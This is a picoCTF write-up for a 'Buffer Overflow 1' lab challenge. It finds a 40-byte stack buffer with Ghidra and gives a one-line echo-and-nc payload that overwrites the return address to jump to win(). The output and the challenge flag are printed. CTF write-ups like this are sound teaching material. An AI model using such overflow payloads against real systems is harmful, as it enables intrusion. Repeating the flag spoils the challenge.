# Buffer Overflow 1

## Description
Control the return address
Now we're cooking! You can overflow the buffer and return to the flag function in the program.
You can view source here. And connect with it using nc saturn.picoctf.net 50659

## Solution
From the ELF file provided, try assembling it using ghidra.
![buf-ov1-1](https://i.imgur.com/UxTIQIf.png)
In the vuln function there is a buffer located at EBP-0x28
The buf buffer has a size of 40 bytes (0x28), but there are 4 additional bytes because we want to overwrite the return address on the stack.

Then, because this program has a win function that prints the contents of flag.txt, so we direct the execution to win() by overwriting the return address on the stack
![buf-ov1-2](https://i.imgur.com/wbBPR1L.png)
Just combine the exploit:
```
$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08" | nc saturn.picoctf.net 56362
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_b15b081e}
```

## Flag
    picoCTF{addr3ss3s_ar3_3asy_b15b081e}